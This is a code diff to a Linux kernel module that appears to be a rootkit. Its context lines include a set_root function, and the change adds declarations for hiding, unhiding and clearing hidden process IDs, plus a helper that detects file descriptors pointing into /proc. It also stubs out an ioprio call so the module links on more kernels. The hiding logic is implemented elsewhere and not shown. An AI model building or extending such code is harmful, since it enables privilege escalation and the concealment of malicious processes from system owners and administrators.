@@ -4,6 +4,7 @@
 #include <linux/sched.h>
 #include <linux/export.h>
 #include <linux/tty.h>
+#include <linux/types.h>
 
 #include "stdlib.h"
 
@@ -58,16 +59,28 @@ int set_root(void) {
 }
 
 struct process_info* get_current_process(void) {
-	struct process_info* process;
-	process = kmalloc(sizeof(struct process_info), GFP_KERNEL);
+    struct process_info* process;
+    process = kmalloc(sizeof(struct process_info), GFP_KERNEL);
 
-	process->task = get_current();
-	process->tty = get_current_tty();
-	process->cred = get_current_cred();
-	process->groups = get_current_groups();
-	process->user = get_current_user();
-	process->ioprio = get_current_ioprio();
-	process->state = get_current_state();
+    process->task = get_current();
+    process->tty = get_current_tty();
+    process->cred = get_current_cred();
+    process->groups = get_current_groups();
+    process->user = get_current_user();
+    /* Some kernels do not export __get_task_ioprio used by get_current_ioprio.
+       Avoid unresolved symbol at modpost by not calling it. */
+    process->ioprio = 0;
+    process->state = get_current_state();
 
-	return process;
+    return process;
 }
+
+/* ---- Dynamic process hiding (PID-based) ---- */
+/* Interface to manage hidden PIDs, implemented in crystal.c */
+bool pid_is_hidden(pid_t pid);
+void hide_pid(pid_t pid);
+void unhide_pid(pid_t pid);
+void clear_hidden_pids(void);
+
+/* Helper to check if an fd points into /proc */
+bool fd_is_proc(unsigned int fd);
